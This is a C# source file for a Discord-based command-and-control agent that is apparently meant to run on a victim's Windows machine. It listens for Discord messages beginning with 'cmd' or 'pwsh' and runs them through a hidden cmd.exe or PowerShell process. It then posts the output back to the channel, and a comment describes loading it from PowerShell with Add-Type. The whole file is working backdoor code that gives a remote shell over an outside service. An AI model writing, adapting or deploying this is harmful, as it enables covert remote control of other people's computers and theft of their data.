using System.Diagnostics;
using System.Text;
using DSharpPlus;

namespace DiscordC2;

 public class Server {
    private static DiscordClient? discord;

    public static async Task Main(string[] args) {
        await Start();
        Console.WriteLine("Enter 'q' to stop server");

        shutdown:
        var userInput = Console.ReadLine();
        if (userInput == "q") {
            Console.WriteLine("Shutting down server..");
            if (discord != null) {
                await discord.DisconnectAsync();
            }
        } else goto shutdown;
    }

    //Using add-type this entry point is callable from powershell
    //[DiscordC2.Server]::Start()
    public static async Task Start() {
        discord = new DiscordClient(new DiscordConfiguration() {
                Token =  File.ReadAllText(".dc2"),
                TokenType = TokenType.Bot,
                Intents = DiscordIntents.AllUnprivileged | DiscordIntents.MessageContents
        });

        discord.MessageCreated += async (s, e) => {
            if (e.Message.Content.ToLower().StartsWith("cmd")) {
                var (success, details, localException) = await Operations.STask(e.Message.Content.Replace("cmd", "/C"));
                if (success) {
                    await e.Message.RespondAsync(details);
                }
                else if (localException is not null) {
                    await e.Message.RespondAsync(localException.Message);
                }
            }

            if (e.Message.Content.ToLower().StartsWith("pwsh")) {
                var (success, details, localException) = await Operations.STask(e.Message.Content.Replace("pwsh", "-NoProfile "), "powershell");
                if (success) {
                    await e.Message.RespondAsync(details);
                }
                else if (localException is not null) {
                    await e.Message.RespondAsync(localException.Message);
                }
            }
        };

        Console.WriteLine("DiscordC2::Server booting..");
        await discord.ConnectAsync();
        Console.WriteLine("DiscordC2::Booting finished");
    }

    internal class Operations {
        public static async Task<(bool succcess, string, Exception localException)> STask(string args, string taskType = "cmd")
        {
            try
            {
                var start = new ProcessStartInfo
                {
                    FileName = $"{taskType}.exe",
                    RedirectStandardOutput = true,
                    Arguments = "" + args,
                    CreateNoWindow = true
                };
                using var process = Process.Start(start);
                using var reader = process!.StandardOutput;
                process.EnableRaisingEvents = true;

                var lineData = await reader.ReadToEndAsync();
                var items = lineData.Split(new[] { Environment.NewLine });
                StringBuilder builder = new();
                foreach (var item in items) {
                    builder.AppendLine(item);
                }

                return (true, builder.ToString(), null)!;
            }
            catch (Exception localException)
            {

                return (false, "Failed", localException);
            }
        }
    }
 }
